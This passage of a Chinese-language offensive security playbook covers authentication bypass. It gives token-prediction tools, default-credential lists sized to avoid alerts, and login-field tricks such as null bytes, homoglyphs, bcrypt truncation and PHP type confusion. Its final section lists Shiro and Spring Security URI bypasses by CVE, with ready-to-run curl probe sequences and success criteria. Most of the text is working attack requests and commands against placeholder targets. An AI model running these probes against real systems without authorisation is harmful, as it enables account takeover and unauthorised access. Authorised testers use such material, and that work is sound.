    print(f"Offset {offset}s: {candidate}")
```

**4. PHP mt_rand() 状态恢复**
_Mersenne Twister PRNG 可逆推种子_
```
# mt_rand() 基于 Mersenne Twister
# 观察 ~624 个输出即可恢复完整内部状态
# 工具: openwall/php_mt_seed
# 有已知输出 → 恢复种子 → 预测所有后续值

# 适用于: 验证码生成、CSRF token、密码重置token
# 收集方法: 重复请求验证码/CSRF token，提取数值序列
```

**5. 通用Token预测工具**
```
# guidtool — UUID v1 重建
# AethliosIK/reset-tolkien — 密码重置Token自动预测
# openwall/php_mt_seed — PHP mt_rand 种子恢复
# Burp Sequencer — 会话Token随机性分析
```

**WAF/EDR 绕过变体：**

**1. 时间同步辅助预测**
_利用HTTP响应头泄露服务器时间来缩小预测范围_
```
# 从响应头获取服务器时间:
curl -sI "https://{TARGET}/" | grep -iE "date:|last-modified:"
# Date: Thu, 25 Jun 2026 10:30:00 GMT

# 多次请求分析时钟偏差:
for i in $(seq 1 10); do
  curl -sI "https://{TARGET}/" | grep "^Date:"
  sleep 0.5
done
# 精确到秒后缩小token生成时间窗口
```

---


## D. 凭据规划与字段操纵

### 默认凭据与服务聚焦  `auth-cred-planning`
按服务类型使用针对性小字典，避免大规模爆破触发告警。
子类：**认证绕过** · tags: `默认凭据` `字典规划` `端口聚焦`

**服务优先小字典**

| 服务 | 优先用户名 | 优先密码 |
|------|-----------|---------|
| phpMyAdmin | `root`, `admin` | 空, `root`, `phpmyadmin`, `admin` |
| FTP | `ftp`, `admin`, `test` | 空, `ftp`, `admin`, `123456` |
| SSH | `root`, `admin`, 应用服务账号 | `root`, `admin` |
| MySQL | `root`, `mysql` | 空, `root`, `mysql` |
| Tomcat/Java admin | `tomcat`, `admin`, `manager` | `tomcat`, `admin`, `s3cret` |
| WebLogic | `weblogic`, `admin` | `weblogic`, `welcome1`, `admin` |

**用户名变体类别**

| 类别 | 示例 |
|------|------|
| 通用管理员 | `admin`, `administrator`, `root`, `test`, `guest` |
| 运维/支持 | `dev`, `ops`, `sysadmin`, `service`, `backup` |
| 姓名组合 | `firstname`, `lastname`, `f.lastname`, `first.last` |
| 邮箱推导 | 企业邮箱格式左侧部分 |
| 产品名 | `tomcat`, `weblogic`, `jenkins`, `gitlab` |

**字典规模选择**

| 场景 | 推荐大小 | 原因 |
|------|---------|------|
| 默认管理面板 | 5-50 条密码 | 默认凭据比大字典命中率高 |
| 已知产品内网服务 | 厂商专用小集 | 比通用词表信号更强 |
| 弱控消费者登录 | Top 20-100 | 快速验证 |
| 有限速登录 | 极小列表+Header轮换策略 | 节省尝试次数 |
| 离线Hash破解 | 大字典 | 在线爆破规则不适用 |

**优先端口**: 80/443/8080/8443(管理面板), 22(SSH), 21(FTP), 3306/5432/6379/27017(数据库/缓存)


### 用户名/密码字段操纵  `auth-field-manip`
利用服务端对特殊字符、编码、截断的处理差异实现认证绕过。
子类：**认证绕过** · tags: `字段操纵` `Null字节` `Unicode` `截断`

**攻击链：**

**1. Null字节注入**
_Null字节在某些字符串比较中被截断_
```
# C-string比较: "admin\0attacker" == "admin"
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin%00@attacker.com&password=pass
# 某些语言: 只读到null → username="admin"

# 多编码尝试
username=admin%00
username=admin\0
username=admin\x00
```

**2. Unicode同形异义字冒充**
_视觉相同但编码不同的字符_
```
# 常用 Unicode 同形字 (Homoglyph):
# a → ⓐ α а (Cyrillic 'а' U+0430)
# d → ԁ (Cyrillic) 
# m → м (Cyrillic)
# i → і (Cyrillic i)  ì
# n → ո (Armenian)

# 注册 "аdmin" (第一个字母是 Cyrillic 'а' U+0430) 
# → 视觉上 = "admin"
# → 如果系统用 NFKC 归一化 → 被识别为 admin → 冒充
```

**3. bcrypt 72字节截断**
_bcrypt 只处理前72字节，超出部分被忽略_
```
# 注册密码: "A" * 100
# bcrypt 只哈希前72字节
# 登录密码: "A" * 72 + "任意后缀" → 也哈希为前72字节的"A"*72
# → 72字节后的变化不影响认证！

# 测试: 注册用密码 "A"*100，登录用 "A"*72+"totally_different"
# 如果登录成功 → bcrypt 截断漏洞
```

**4. 密码字段类型混淆**
_PHP 松散比较绕过_
```
# PHP < 8.0: 0 == "any_string" → true
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":0}
# password=0 与任何非数字字符串比较 → true → 绕过

# PHP strcmp 数组绕过
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

user=admin&pass[]=1
# strcmp(array, string) 返回 NULL; NULL == 0 → true
```

**5. 密码修改无需当前密码**
_能否在不知旧密码的情况下改密码_
```
# 测试: 不带 current_password 字段
PUT /api/user/password HTTP/1.1
Authorization: Bearer {TOKEN}
Content-Type: application/json

{"new_password": "hacked123"}
# 如果返回200 → 可与CSRF组合实现账户接管

# 测试 null/空值
{"current_password": "", "new_password": "hacked123"}
```

**6. 会话在权限变更后不刷新**
_角色升级后旧Token继承新权限_
```
# 1. 用低权限账户登录 → 获取 session cookie
# 2. 管理员将你的角色从 user 升级为 admin
# 3. 使用步骤1的旧 session cookie 访问 /admin
GET /admin/dashboard HTTP/1.1
Cookie: session={OLD_LOW_PRIV_SESSION}
# 如果访问成功 → 会话未在权限变更时重新生成
```

**7. 退出登录后会话未失效**
```
# 1. 登录 → 捕获 session cookie
# 2. 点击"退出登录"
# 3. 重放步骤1的 session cookie
curl -b "session={LOGGED_OUT_SESSION}" "https://{TARGET}/dashboard"
# 如果返回200 → session 服务端未失效
```

---


---

---

### Java框架认证绕过  `auth-java-bypass`
利用Shiro / Spring Security等Java安全框架的URI解析差异绕过认证拦截器
子类：**Java认证绕过** · tags: `java` `shiro` `spring-security` `auth-bypass` `uri`

**前置条件：** 目标使用Shiro/Spring Security等Java认证框架

**攻击链：**

**1. 1. 识别Java安全框架**
_通过Cookie/响应头/错误页面识别认证框架类型_
```
# Shiro检测:
# 1. Set-Cookie含 rememberMe=deleteMe
# 2. 错误页面含 "org.apache.shiro"
# 3. 未认证页面返回 login.jsp / login 302

# Spring Security检测:
# 1. 默认登录页 /login (Spring Security自带)
# 2. 未认证返回 302 /login 或 401/403
# 3. 响应头可能含 X-Content-Type-Options / X-Frame-Options (Spring Security默认)
# 4. CSRF Token: _csrf 参数

# 自定义Filter检测:
# 1. 观察302 Location: /login /admin/login 等
# 2. 观察认证Cookie名称: JSESSIONID / SESSION / token / Authorization
```

**2. 2. Shiro URI匹配绕过(分号/换行/编码)**
_利用Shiro AntPathMatcher与Servlet容器URI解析差异_
```
# 核心原理: Shiro使用 request.getRequestURI() 做权限匹配
# 而Spring MVC使用 request.getServletPath() 做路由分发
# 两者对特殊字符处理不同 → 绕过机会

# 方法1: 分号绕过(Shiro < 1.5.2, CVE-2020-1957)
GET /admin/;.js HTTP/1.1
# Shiro看到的URI: /admin/;.js → Ant匹配: /admin/** 不匹配 /admin/;.js → 放行!
# Tomcat解析: /admin/;.js → ServletPath: /admin/ → 到达Controller

# 方法2: 双斜杠绕过(Shiro < 1.5.3, CVE-2020-11989)
GET /admin//xxx HTTP/1.1
GET //admin/xxx HTTP/1.1
# Shiro规范化后仍拦截，但某些容器 → 直接路由到/admin

# 方法3: URL编码分号(Shiro < 1.6.0, CVE-2020-13933)
GET /admin%3bxxx HTTP/1.1
# Shiro不做URL解码 → 看到 /admin%3bxxx → 不匹配拦截规则 → 放行
# Tomcat做URL解码 → /admin;xxx → 路由到/admin

# 方法4: 换行符绕过(Shiro < 1.7.1, CVE-2020-17523)
GET /admin%0axxx HTTP/1.1
# Shiro: /admin%0axxx → 不匹配
# Tomcat: /admin%0axxx → 截断为/admin(部分版本)

# 方法5: 反斜杠/路径穿越绕过(Shiro < 1.8.0, CVE-2021-41303)
GET /admin/..;/public HTTP/1.1
# Shiro路径规范化差异 → 绕过

# 方法6: 双星号绕过(Shiro < 1.9.1, CVE-2022-32532)
GET /**/admin HTTP/1.1
# 部分容器: /**/admin → 忽略** → 路由到/admin

# 方法7: 点号绕过(Shiro < 1.11.0, CVE-2023-22602)
GET /admin%2e%2e/ HTTP/1.1
# Shiro路径规范化差异 → 绕过

# 通用测试命令:
curl -sI "http://target/admin/;.js"
curl -sI "http://target/admin%3bxxx"
curl -sI "http://target/admin%0axxx"
# 返回200且内容为非登录页 → 绕过成功
```

**3. 3. Spring Security绕过**
_利用Spring Security与Spring MVC的URI匹配差异_
```
# 双斜杠绕过(CVE-2022-31692, < 5.7.5):
GET //admin/xxx HTTP/1.1
# 某些容器不做规范化 → Spring Security未匹配 → 放行

# 分号绕过(CVE-2022-22978):
GET /admin;/xxx HTTP/1.1
# Servlet容器路径参数处理差异

# 大小写绕过:
GET /Admin/xxx HTTP/1.1
# Spring Security antMatchers 默认区分大小写
# 如果配置为 antMatchers("/admin/**") 而非 mvcMatchers → /Admin/xxx绕过

# %2e绕过:
GET /admin%2e%2e/xxx HTTP/1.1
# 路径规范化差异
```

**4. 4. 通用认证绕过探测序列**
_对任意Java Web认证进行URI bypass尝试_
```
# 按优先级测试(每次改完URI后观察响应):
# 1. 基础URI bypass:
curl -sI "http://target/admin/;.js"
curl -sI "http://target/admin/;xxx"
curl -sI "http://target/admin;xxx"
curl -sI "http://target//admin/"
curl -sI "http://target/admin//"
curl -sI "http://target/admin/./"

# 2. URL编码bypass:
curl -sI "http://target/admin%3b"
curl -sI "http://target/admin%3bxxx"
curl -sI "http://target/admin%0a"
curl -sI "http://target/admin%0d"
curl -sI "http://target/admin%00"
curl -sI "http://target/admin%2f"

# 3. 双重编码bypass:
curl -sI "http://target/admin%253b"
curl -sI "http://target/admin%252f"

# 4. case + 编码:
curl -sI "http://target/Admin"
curl -sI "http://target/ADMIN"
curl -sI "http://target/%61dmin"

# 5. 路径穿越 + 编码组合:
curl -sI "http://target/public/../admin"
curl -sI "http://target/..;/admin"
curl -sI "http://target/admin/..;/..;/public"

# 6. 请求方法影响(某些Filter只拦截GET):
curl -sI -X POST "http://target/admin/;.js"
curl -sI -X OPTIONS "http://target/admin/;.js"
curl -sI -X HEAD "http://target/admin/;.js"

# 判断标准:
# 200 OK + 非登录页 → 认证绕过成功
# 302 → 登录页 → 拦截成功(继续换方法)
# 403 → 已认证但授权不足 → URI已绕过认证，遇授权问题
```

---

← 回 [00-index.md](00-index.md) · 相关:`references/playbooks/logic-flaws/00-index.md`(业务逻辑层密码重置)
